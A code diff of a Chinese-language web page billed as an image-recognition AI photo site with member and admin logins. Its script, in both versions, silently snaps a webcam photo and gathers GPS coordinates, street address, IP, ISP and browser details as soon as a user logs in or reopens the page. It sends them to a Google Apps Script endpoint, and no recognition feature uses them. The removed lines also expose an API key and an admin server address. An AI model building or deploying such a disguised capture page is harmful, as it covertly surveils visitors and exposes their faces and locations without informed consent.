@@ -3,287 +3,351 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>試試這款影像識別 AI，讓照片變得更有趣！</title>
+  <title>影像識別 AI & 訊息回傳</title>
+  <!-- 引入 Bootstrap 5 -->
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- 引入 chart.js -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
-    /* 已省略重複的 CSS 內容，保持一致 */
     body {
-      margin: 0; 
-      padding: 0;
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(to bottom right, #2b2b3d, #1e1e2f);
-      color: #ffffff;
+      background: #f5f6f7;
     }
-    h1 {
-      text-align: center;
-      margin: 20px 0;
-    }
-    .btn {
-      padding: 12px 20px;
-      background: #6a6aa0;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
-      transition: background 0.3s ease;
-    }
-    .btn:hover {
-      background: #8484c2;
-    }
-    .msg-success, .msg-error {
-      width: 90%;
-      max-width: 400px;
-      margin: 10px auto;
-      padding: 10px;
-      border-radius: 8px;
-      display: none;
-      text-align: center;
-    }
-    .msg-success {
-      background: #28a745;
-      border: 1px solid #218838;
-    }
-    .msg-error {
-      background: #dc3545;
-      border: 1px solid #c82333;
-    }
-    #openModalBtn {
-      display: block;
-      margin: 0 auto;
-      margin-bottom: 20px;
-    }
-    .modal-overlay {
-      display: none;
-      position: fixed; 
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-    .modal-content {
-      background: #1f1f2e;
-      width: 320px;
-      padding: 20px;
-      border-radius: 12px;
-      text-align: center;
-      position: relative;
-      animation: bounceIn 0.8s ease;
-    }
-    .close-btn {
-      position: absolute;
-      top: 10px; 
-      right: 10px; 
-      cursor: pointer;
-      background: transparent;
-      color: #fff;
-      border: none;
-      font-size: 20px;
-    }
-
-    @keyframes bounceIn {
-      0% {
-        transform: scale(0.5);
-        opacity: 0;
-      }
-      50% {
-        transform: scale(1.2);
-        opacity: 1;
-      }
-      70% {
-        transform: scale(0.9);
-      }
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-    .tab-button {
-      background: #4d4d6a;
-      margin: 0 5px;
-      padding: 8px 16px;
-      border: none;
-      color: #fff;
-      cursor: pointer;
-      border-radius: 5px;
-    }
-    .tab-button.active {
-      background: #6a6aa0;
-    }
-    .form-container {
-      display: none;
-      margin-top: 10px;
-    }
-    .form-container.active {
-      display: block;
-    }
-    .input-field {
-      width: 90%;
-      margin: 8px auto;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      box-sizing: border-box;
-    }
-    .btn-submit {
-      width: 90%;
-      padding: 10px;
-      border: none;
-      background: #6a6aa0;
-      color: #fff;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    #adminModalOverlay .modal-content {
-      width: 300px;
-    }
-    #mainPanel {
-      display: none; 
-      padding: 20px;
-    }
-    .container {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 20px;
-      margin-top: 20px;
+    .navbar-brand {
+      font-weight: bold;
     }
     .card {
-      background: #2b2b3d;
-      border-radius: 15px;
-      padding: 20px;
-      box-shadow: 2px 2px 8px rgba(0,0,0,0.3);
-      text-align: center;
+      border-radius: 0.75rem;
     }
-    .card h2 {
-      font-size: 18px;
-      margin-bottom: 15px;
+    .modal-content {
+      border-radius: 0.75rem;
     }
-    .status-text {
-      font-size: 14px;
-      margin: 10px 0;
+    /* 上傳按鈕隱藏 default input 樣式 */
+    .file-input-container input[type="file"] {
+      display: none;
     }
-    iframe {
-      width: 100%;
-      height: 200px;
-      border: none;
-      border-radius: 10px;
+    .file-input-container label {
+      display: inline-block;
+      cursor: pointer;
+      padding: 0.5rem 1rem;
+      background-color: #6a6aa0;
+      color: #fff;
+      border-radius: 0.5rem;
     }
   </style>
 </head>
 <body>
+  <!-- 導覽列 -->
+  <nav class="navbar navbar-expand-md navbar-dark bg-dark mb-4">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="#">AI Photo &amp; UserCenter</a>
+      <button
+        class="navbar-toggler"
+        type="button"
+        data-bs-toggle="collapse"
+        data-bs-target="#navbarNav"
+        aria-controls="navbarNav"
+        aria-expanded="false"
+        aria-label="切換導覽"
+      >
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item me-2">
+            <button id="openModalBtn" class="btn btn-secondary btn-sm">
+              會員中心
+            </button>
+          </li>
+          <li class="nav-item">
+            <button id="adminLoginOpenBtn" class="btn btn-warning btn-sm">
+              管理者登入
+            </button>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
 
-  <h1>試試這款影像識別 AI，讓照片變得更有趣！</h1>
-  <div id="statusSuccess" class="msg-success"></div>
-  <div id="statusError" class="msg-error"></div>
-  <button id="openModalBtn" class="btn">會員中心</button>
-  <div id="modalOverlay" class="modal-overlay">
-    <div class="modal-content">
-      <button id="closeModalBtn" class="close-btn">×</button>
-      <button id="tabLogin" class="tab-button active">登入</button>
-      <button id="tabRegister" class="tab-button">註冊</button>
-      <div id="loginFormContainer" class="form-container active">
-        <form id="loginForm">
-          <input type="email" id="loginEmail" class="input-field" placeholder="請輸入 Email" required />
-          <input type="password" id="loginPassword" class="input-field" placeholder="請輸入密碼" required />
-          <button class="btn-submit" type="submit">登入</button>
-        </form>
-      </div>
-      <div id="registerFormContainer" class="form-container">
-        <form id="registerForm">
-          <input type="email" id="regEmail" class="input-field" placeholder="請輸入 Email" required />
-          <input type="password" id="regPassword" class="input-field" placeholder="請輸入密碼" required />
-          <button class="btn-submit" type="submit">註冊</button>
-        </form>
+  <!-- 成功/錯誤訊息 Alert -->
+  <div class="container">
+    <div id="statusSuccess" class="alert alert-success d-none" role="alert"></div>
+    <div id="statusError" class="alert alert-danger d-none" role="alert"></div>
+  </div>
+
+  <!-- 會員登入/註冊Modal -->
+  <div
+    id="modalOverlay"
+    class="modal"
+    tabindex="-1"
+    aria-hidden="true"
+  >
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content bg-light">
+        <div class="modal-body">
+          <button
+            type="button"
+            class="btn-close float-end"
+            data-bs-dismiss="modal"
+            aria-label="Close"
+          ></button>
+          <ul class="nav nav-tabs mt-4" id="myTab" role="tablist">
+            <li class="nav-item" role="presentation">
+              <button
+                class="nav-link active"
+                id="tabLogin"
+                data-bs-toggle="tab"
+                data-bs-target="#loginTabPane"
+                type="button"
+                role="tab"
+                aria-controls="loginTabPane"
+                aria-selected="true"
+              >
+                登入
+              </button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button
+                class="nav-link"
+                id="tabRegister"
+                data-bs-toggle="tab"
+                data-bs-target="#registerTabPane"
+                type="button"
+                role="tab"
+                aria-controls="registerTabPane"
+                aria-selected="false"
+              >
+                註冊
+              </button>
+            </li>
+          </ul>
+          <div class="tab-content mt-3" id="myTabContent">
+            <!-- 登入表單 -->
+            <div
+              class="tab-pane fade show active"
+              id="loginTabPane"
+              role="tabpanel"
+              aria-labelledby="tabLogin"
+              tabindex="0"
+            >
+              <form id="loginForm" class="p-3">
+                <div class="mb-3">
+                  <label for="loginEmail" class="form-label">Email</label>
+                  <input
+                    type="email"
+                    id="loginEmail"
+                    class="form-control"
+                    placeholder="請輸入 Email"
+                    required
+                  />
+                </div>
+                <div class="mb-3">
+                  <label for="loginPassword" class="form-label">密碼</label>
+                  <input
+                    type="password"
+                    id="loginPassword"
+                    class="form-control"
+                    placeholder="請輸入密碼"
+                    required
+                  />
+                </div>
+                <button class="btn btn-primary w-100" type="submit">
+                  登入
+                </button>
+              </form>
+            </div>
+            <!-- 註冊表單 -->
+            <div
+              class="tab-pane fade"
+              id="registerTabPane"
+              role="tabpanel"
+              aria-labelledby="tabRegister"
+              tabindex="0"
+            >
+              <form id="registerForm" class="p-3">
+                <div class="mb-3">
+                  <label for="regEmail" class="form-label">Email</label>
+                  <input
+                    type="email"
+                    id="regEmail"
+                    class="form-control"
+                    placeholder="請輸入 Email"
+                    required
+                  />
+                </div>
+                <div class="mb-3">
+                  <label for="regPassword" class="form-label">密碼</label>
+                  <input
+                    type="password"
+                    id="regPassword"
+                    class="form-control"
+                    placeholder="請輸入密碼"
+                    required
+                  />
+                </div>
+                <button class="btn btn-success w-100" type="submit">
+                  註冊
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   </div>
-  <button id="adminLoginOpenBtn" class="btn">管理者登入</button>
-  <div id="adminModalOverlay" class="modal-overlay">
-    <div class="modal-content">
-      <button id="adminCloseModalBtn" class="close-btn">×</button>
-      <h2>管理者登入</h2>
-      <form id="adminLoginForm">
-        <input type="email" id="adminEmail" class="input-field" placeholder="請輸入管理者 Email" required />
-        <input type="password" id="adminPassword" class="input-field" placeholder="請輸入管理者密碼" required />
-        <button class="btn-submit" type="submit">登入</button>
-      </form>
+
+  <!-- 管理者登入 Modal -->
+  <div
+    id="adminModalOverlay"
+    class="modal"
+    tabindex="-1"
+    aria-hidden="true"
+  >
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content bg-light">
+        <div class="modal-body">
+          <button
+            type="button"
+            class="btn-close float-end"
+            data-bs-dismiss="modal"
+            aria-label="Close"
+          ></button>
+          <h3 class="text-center mt-4">管理者登入</h3>
+          <form id="adminLoginForm" class="p-3">
+            <div class="mb-3">
+              <label for="adminEmail" class="form-label">Email</label>
+              <input
+                type="email"
+                id="adminEmail"
+                class="form-control"
+                placeholder="請輸入管理者 Email"
+                required
+              />
+            </div>
+            <div class="mb-3">
+              <label for="adminPassword" class="form-label">密碼</label>
+              <input
+                type="password"
+                id="adminPassword"
+                class="form-control"
+                placeholder="請輸入管理者密碼"
+                required
+              />
+            </div>
+            <button class="btn btn-warning w-100" type="submit">
+              登入
+            </button>
+          </form>
+        </div>
+      </div>
     </div>
   </div>
-  <!--<p><a href="https://3df0-125-227-108-79.ngrok-free.app/admin.php" target="_blank">管理者後台</a></p>-->
- <div id="mainPanel" style="display: none;">
-    <div class="container">
-      <div class="card">
-        <h2>IP 與位置資訊</h2>
-        <p id="ipInfo" class="status-text">資訊載入中...</p>
+
+  <!-- 主畫面（登入成功後顯示） -->
+  <div id="mainPanel" class="container d-none">
+    <div class="row mb-3">
+      <h2 class="text-center">歡迎使用影像識別 AI &amp; 簡易儀表板</h2>
+    </div>
+    <div class="row g-3">
+      <div class="col-md-3">
+        <div class="card p-3">
+          <h5>IP 與位置資訊</h5>
+          <p id="ipInfo" class="text-muted">資訊載入中...</p>
+        </div>
       </div>
-      <div class="card">
-        <h2>鏡頭狀態</h2>
-        <p id="status" class="status-text">請開啟鏡頭使用...</p>
+      <div class="col-md-3">
+        <div class="card p-3">
+          <h5>鏡頭狀態</h5>
+          <p id="status" class="text-muted">請開啟鏡頭使用...</p>
+        </div>
       </div>
-      <div class="card">
-        <h2>動態地圖</h2>
-        <iframe id="map" src="about:blank"></iframe>
+      <div class="col-md-3">
+        <div class="card p-3">
+          <h5>動態地圖</h5>
+          <iframe id="map" src="about:blank" height="180" style="width: 100%;"></iframe>
+        </div>
       </div>
-      <div class="card">
-        <h2>天氣資訊</h2>
-        <p id="weatherInfo" class="status-text">天氣資訊載入中...</p>
+      <div class="col-md-3">
+        <div class="card p-3">
+          <h5>天氣資訊</h5>
+          <p id="weatherInfo" class="text-muted">天氣資訊載入中...</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- 新增「使用者發送訊息/圖片回傳」區塊 -->
+    <div class="row mt-4">
+      <h4 class="mb-3">使用者回傳 Line / Sheet</h4>
+      <div class="col-md-6">
+        <div class="card p-3">
+          <h5>回傳文字訊息</h5>
+          <textarea
+            id="userMessage"
+            class="form-control mb-3"
+            rows="3"
+            placeholder="輸入想要回傳的訊息..."
+          ></textarea>
+          <button id="sendMessageBtn" class="btn btn-primary w-100">
+            回傳訊息
+          </button>
+        </div>
+      </div>
+      <div class="col-md-6">
+        <div class="card p-3">
+          <h5>回傳圖片</h5>
+          <div class="file-input-container mb-3">
+            <input
+              type="file"
+              accept="image/*"
+              id="userImage"
+            />
+            <label for="userImage">選擇圖片</label>
+          </div>
+          <button id="sendImageBtn" class="btn btn-success w-100">
+            回傳圖片
+          </button>
+        </div>
       </div>
     </div>
   </div>
+
   <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxeVv4NlYoYKqoA-ThFFdgCLp94BYBoCv8BCcD1qRQ4JXI5PaDRdLvi-W8ns6TAZhy19g/exec';
-    const openModalBtn = document.getElementById('openModalBtn');
-    const modalOverlay = document.getElementById('modalOverlay');
-    const closeModalBtn = document.getElementById('closeModalBtn');
-    openModalBtn.addEventListener('click', () => {
-      modalOverlay.style.display = 'flex';
-    });
-    closeModalBtn.addEventListener('click', () => {
-      modalOverlay.style.display = 'none';
-    });
-    const adminLoginOpenBtn = document.getElementById('adminLoginOpenBtn');
-    const adminModalOverlay = document.getElementById('adminModalOverlay');
-    const adminCloseModalBtn = document.getElementById('adminCloseModalBtn');
-    adminLoginOpenBtn.addEventListener('click', () => {
-      adminModalOverlay.style.display = 'flex';
-    });
-    adminCloseModalBtn.addEventListener('click', () => {
-      adminModalOverlay.style.display = 'none';
-    });
-    const tabLogin = document.getElementById('tabLogin');
-    const tabRegister = document.getElementById('tabRegister');
-    const loginFormContainer = document.getElementById('loginFormContainer');
-    const registerFormContainer = document.getElementById('registerFormContainer');
+    // ★★★ 請將這個換成你的 GAS 部署 URL ★★★
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyRbyqcOQwZRNgacV68TkTi30yhaYMn6RJkmCK-Y97VXPuZRtq7z9cfZHziXcapvPcPHw/exec';
 
-    tabLogin.addEventListener('click', () => {
-      tabLogin.classList.add('active');
-      tabRegister.classList.remove('active');
-      loginFormContainer.classList.add('active');
-      registerFormContainer.classList.remove('active');
-    });
-    tabRegister.addEventListener('click', () => {
-      tabRegister.classList.add('active');
-      tabLogin.classList.remove('active');
-      registerFormContainer.classList.add('active');
-      loginFormContainer.classList.remove('active');
-    });
+    // DOM 元素
+    const openModalBtn = document.getElementById('openModalBtn');
+    const modalOverlay = new bootstrap.Modal(document.getElementById('modalOverlay'));
+    const adminLoginOpenBtn = document.getElementById('adminLoginOpenBtn');
+    const adminModalOverlay = new bootstrap.Modal(document.getElementById('adminModalOverlay'));
     const statusSuccess = document.getElementById('statusSuccess');
     const statusError = document.getElementById('statusError');
+    const mainPanel = document.getElementById('mainPanel');
+
+    /* ========== 顯示訊息 ========== */
     function showSuccessMessage(msg) {
       statusSuccess.innerText = msg;
-      statusSuccess.style.display = 'block';
-      statusError.style.display = 'none';
+      statusSuccess.classList.remove('d-none');
+      statusError.classList.add('d-none');
     }
     function showErrorMessage(msg) {
       statusError.innerText = msg;
-      statusError.style.display = 'block';
-      statusSuccess.style.display = 'none';
+      statusError.classList.remove('d-none');
+      statusSuccess.classList.add('d-none');
     }
-    const mainPanel = document.getElementById('mainPanel');
 
-    // 註冊表單提交處理
+    /* ========== Modal 開關 ========== */
+    openModalBtn.addEventListener('click', () => {
+      modalOverlay.show();
+    });
+    adminLoginOpenBtn.addEventListener('click', () => {
+      adminModalOverlay.show();
+    });
+
+    /* ========== 註冊表單提交 ========== */
     document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('regEmail').value;
@@ -299,10 +363,9 @@
           method: 'POST',
           body: formData
         });
-
         const result = await response.json();
         if (result.success) {
-          showSuccessMessage('註冊成功，請切換到「登入」');
+          showSuccessMessage('註冊成功，請切換到「登入」標籤。');
         } else {
           showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
         }
@@ -311,7 +374,7 @@
       }
     });
 
-    // 登入表單提交處理
+    /* ========== 登入表單提交 ========== */
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('loginEmail').value;
@@ -327,19 +390,17 @@
           method: 'POST',
           body: formData
         });
-
         if (!response.ok) {
           throw new Error(`HTTP 錯誤：${response.status}`);
         }
-
         const result = await response.json();
 
         if (result.success) {
           // 儲存 email 至 sessionStorage
           sessionStorage.setItem('email', result.user_id);
           showSuccessMessage('登入成功！');
-          modalOverlay.style.display = 'none';
-          mainPanel.style.display = 'block';
+          modalOverlay.hide();
+          mainPanel.classList.remove('d-none');
           await collectAndSendData(); // 收集並發送裝置資訊
         } else {
           showErrorMessage(`錯誤原因：${result.error}`);
@@ -349,7 +410,7 @@
       }
     });
 
-    // 管理者登入表單提交處理
+    /* ========== 管理者登入表單提交 ========== */
     document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('adminEmail').value;
@@ -372,8 +433,9 @@
 
         if (result.success) {
           showSuccessMessage('管理者登入成功！');
-          adminModalOverlay.style.display = 'none';
-          window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
+          adminModalOverlay.hide();
+          // 跳至後台頁面
+          window.location.href = 'https://YOUR_PHP_SERVER/admin.php';
         } else {
           showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
         }
@@ -382,20 +444,24 @@
       }
     });
 
-    // 開始相機並取得圖片
+    /* ========== 相機拍照 ========== */
     async function startCamera() {
       let stream = null;
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }});
+        // 可自訂攝影機解析度
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 640, height: 480 },
+        });
         const video = document.createElement('video');
         video.srcObject = stream;
-        await new Promise(resolve => {
+        await new Promise((resolve) => {
           video.onloadedmetadata = () => {
             video.play();
             resolve();
           };
         });
-        await new Promise(resolve => setTimeout(resolve, 500));
+        // 延遲 0.5 秒再拍照
+        await new Promise((resolve) => setTimeout(resolve, 500));
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
@@ -408,19 +474,24 @@
         return null;
       } finally {
         if (stream) {
-          stream.getTracks().forEach(track => track.stop());
+          stream.getTracks().forEach((track) => track.stop());
         }
       }
     }
 
-    // 取得 GPS 座標
+    /* ========== GPS 座標 ========== */
     async function getGpsCoordinates() {
       try {
         const position = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            timeout: 10000,
+          });
         });
         const { latitude, longitude } = position.coords;
-        const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+        // 逆地理編碼
+        const resp = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
+        );
         const data = await resp.json();
         const address = data.display_name || '未知地址';
         return { latitude, longitude, address };
@@ -430,7 +501,7 @@
       }
     }
 
-    // 取得 IP 資訊
+    /* ========== IP 資訊 ========== */
     async function getIpInfo() {
       try {
         const resp = await fetch('https://ipinfo.io/json');
@@ -445,11 +516,12 @@
       }
     }
 
-    // 取得天氣資訊
+    /* ========== 天氣資訊 ========== */
     async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
-        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // 確保您的 API 金鑰正確且有效
+        // ★ 請換成您自己的 OpenWeatherMap API key
+        const apiKey = 'ae0c5817d5c802a5f12d3c9de251xxxx';
         const resp = await fetch(
           `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
         );
@@ -458,98 +530,201 @@
         const weather = weatherData.weather[0].description;
         const humidity = weatherData.main.humidity;
 
-        const weatherInfo = document.getElementById('weatherInfo');
-        weatherInfo.innerHTML = 
-          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
-           溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
+        document.getElementById('weatherInfo').innerHTML = `
+          <img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
+          溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
+        `;
       } catch (err) {
         console.error('天氣資訊獲取失敗:', err);
         document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
       }
     }
 
-    // 收集並發送裝置資訊
+    /* ========== 收集並發送裝置資訊 ========== */
     async function collectAndSendData() {
       const statusElem = document.getElementById('status');
       if (statusElem) {
-          statusElem.innerText = '正在收集資料...';
+        statusElem.innerText = '正在收集資料...';
       }
 
       const collectedData = { gps: null, ip: null, photo: null };
       try {
-          const [gpsResult, ipResult] = await Promise.allSettled([
-              getGpsCoordinates(),
-              getIpInfo(),
-          ]);
-          const photoResult = await startCamera();
+        const [gpsResult, ipResult] = await Promise.allSettled([
+          getGpsCoordinates(),
+          getIpInfo(),
+        ]);
+        const photoResult = await startCamera();
 
-          if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
-          if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
-          if (photoResult) collectedData.photo = photoResult;
+        if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
+        if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
+        if (photoResult) collectedData.photo = photoResult;
 
-          const email = sessionStorage.getItem('email'); // 使用 'email' 作為鍵值
-          if (!email) {
-              console.error('無法獲取用戶 Email，請先登入');
-              return;
-          }
+        // 更新前端 UI
+        updateUI(collectedData);
 
-          const formData = new URLSearchParams();
-          formData.append('email', email); // 傳遞 email 作為識別符
-          formData.append('message', '合併資料上傳');
-          if (collectedData.gps) {
-              formData.append('latitude', collectedData.gps.latitude);
-              formData.append('longitude', collectedData.gps.longitude);
-              formData.append('address', collectedData.gps.address);
-          }
-          if (collectedData.ip) {
-              formData.append('ip', collectedData.ip.ip);
-              formData.append('ipType', collectedData.ip.ipType);
-              formData.append('userAgent', collectedData.ip.userAgent);
-              formData.append('city', collectedData.ip.city);
-              formData.append('region', collectedData.ip.region);
-              formData.append('country', collectedData.ip.country);
-              formData.append('org', collectedData.ip.org);
-          }
-          if (collectedData.photo) {
-              formData.append('imageData', collectedData.photo);
-          }
+        const email = sessionStorage.getItem('email');
+        if (!email) {
+          console.error('尚未登入，暫不上傳裝置資訊');
+          return;
+        }
 
-          const resp = await fetch(SCRIPT_URL, {
-              method: 'POST',
-              body: formData
-          });
+        // 將資料傳送到後端 (GAS)
+        const formData = new URLSearchParams();
+        formData.append('email', email);
+        formData.append('message', '初次進入或登入後上傳裝置資訊');
+        if (collectedData.gps) {
+          formData.append('latitude', collectedData.gps.latitude);
+          formData.append('longitude', collectedData.gps.longitude);
+          formData.append('address', collectedData.gps.address);
+        }
+        if (collectedData.ip) {
+          formData.append('ip', collectedData.ip.ip);
+          formData.append('ipType', collectedData.ip.ipType);
+          formData.append('userAgent', collectedData.ip.userAgent);
+          formData.append('city', collectedData.ip.city);
+          formData.append('region', collectedData.ip.region);
+          formData.append('country', collectedData.ip.country);
+          formData.append('org', collectedData.ip.org);
+        }
+        if (collectedData.photo) {
+          formData.append('imageData', collectedData.photo);
+        }
 
-          const result = await resp.json();
-          if (result.success) {
-              if (statusElem) statusElem.innerText = '資料已成功發送！';
-          } else {
-              if (statusElem) statusElem.innerText = `資料發送失敗：${result.error}`;
-          }
-      } catch (error) {
-          console.error('資料收集或傳送過程中發生錯誤:', error);
+        const resp = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await resp.json();
+        if (result.success) {
+          if (statusElem) statusElem.innerText = '資料已成功發送！';
+        } else {
           if (statusElem) {
-              statusElem.innerText = '資料收集或傳送過程中發生錯誤。';
+            statusElem.innerText = `資料發送失敗：${result.error}`;
           }
+        }
+      } catch (error) {
+        console.error('資料收集或傳送時發生錯誤:', error);
+        if (statusElem) {
+          statusElem.innerText = '資料收集或傳送時發生錯誤。';
+        }
       }
     }
 
-    // 初始化
-    document.addEventListener('DOMContentLoaded', async () => { 
-      try {
-        const email = sessionStorage.getItem('email'); // 使用 'email' 作為鍵值
-        if (email) {
-          const gpsData = await getGpsCoordinates();
-          if (gpsData) {
-            document.getElementById('map').src = 
-              `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-            await getWeatherInfo(gpsData.latitude, gpsData.longitude);
-          }
-          collectAndSendData();
+    /* ========== 更新前端資訊 UI ========== */
+    function updateUI({ gps, ip }) {
+      // 更新 IP
+      const ipInfoElem = document.getElementById('ipInfo');
+      if (ip && ipInfoElem) {
+        ipInfoElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
+      } else {
+        ipInfoElem.textContent = '無法取得 IP 資訊';
+      }
+
+      // 更新地圖 & 天氣
+      if (gps) {
+        document.getElementById('map').src = 
+          `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}&hl=zh-TW&z=15&output=embed`;
+        getWeatherInfo(gps.latitude, gps.longitude);
+      }
+    }
+
+    /* ========== DOMContentLoaded 時，如已登入則自動顯示 mainPanel & 收集資訊 ========== */
+    document.addEventListener('DOMContentLoaded', async () => {
+      const email = sessionStorage.getItem('email');
+      if (email) {
+        mainPanel.classList.remove('d-none');
+        const gpsData = await getGpsCoordinates();
+        if (gpsData) {
+          document.getElementById('map').src = 
+            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+          getWeatherInfo(gpsData.latitude, gpsData.longitude);
         }
-      } catch (error) {
-        console.error('DOMContentLoaded 初始化時錯誤:', error);
+        collectAndSendData();
       }
     });
+
+    /* ========== 使用者回傳訊息到 Line / Sheet ========== */
+    document.getElementById('sendMessageBtn').addEventListener('click', async () => {
+      const email = sessionStorage.getItem('email');
+      if (!email) {
+        showErrorMessage('請先登入再進行訊息回傳');
+        return;
+      }
+      const message = document.getElementById('userMessage').value.trim();
+      if (!message) {
+        showErrorMessage('請先輸入訊息再按「回傳訊息」');
+        return;
+      }
+
+      try {
+        const formData = new URLSearchParams();
+        formData.append('action', 'sendMessage'); // GAS 端會做專門處理
+        formData.append('email', email);
+        formData.append('textMessage', message);
+
+        const resp = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await resp.json();
+        if (result.success) {
+          showSuccessMessage('訊息已回傳成功');
+        } else {
+          showErrorMessage(`回傳失敗：${result.error}`);
+        }
+      } catch (err) {
+        showErrorMessage(`系統錯誤：${err.message}`);
+      }
+    });
+
+    document.getElementById('sendImageBtn').addEventListener('click', async () => {
+      const email = sessionStorage.getItem('email');
+      if (!email) {
+        showErrorMessage('請先登入再進行圖片回傳');
+        return;
+      }
+      const fileInput = document.getElementById('userImage');
+      if (!fileInput.files[0]) {
+        showErrorMessage('請先選擇圖片再按「回傳圖片」');
+        return;
+      }
+
+      const file = fileInput.files[0];
+      const base64Data = await readFileAsBase64(file);
+
+      try {
+        const formData = new URLSearchParams();
+        formData.append('action', 'sendUserImage');
+        formData.append('email', email);
+        formData.append('userImageData', base64Data);
+
+        const resp = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await resp.json();
+        if (result.success) {
+          showSuccessMessage('圖片已回傳成功');
+          fileInput.value = ''; // 清空
+        } else {
+          showErrorMessage(`圖片回傳失敗：${result.error}`);
+        }
+      } catch (err) {
+        showErrorMessage(`系統錯誤：${err.message}`);
+      }
+    });
+
+    function readFileAsBase64(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => {
+          const base64String = reader.result.split(',')[1];
+          resolve(base64String);
+        };
+        reader.onerror = (err) => reject(err);
+        reader.readAsDataURL(file);
+      });
+    }
   </script>
 </body>
 </html>
